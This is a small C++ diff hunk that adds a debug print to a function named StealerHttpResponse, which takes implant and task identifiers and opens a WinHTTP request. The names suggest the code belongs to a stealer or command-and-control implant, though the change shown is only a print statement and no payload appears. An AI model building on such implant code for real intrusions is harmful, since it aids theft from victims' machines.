@@ -434,6 +434,10 @@ std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, js
     std::wstring get_uri(uri.begin(), uri.end());
     LPCWSTR uriptr = get_uri.c_str();
 
+    std::wcout << L"gabbagool " << uriptr << '\n';
+
+
+
     // The WinHttpOpenRequest function creates an HTTP request handle.
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
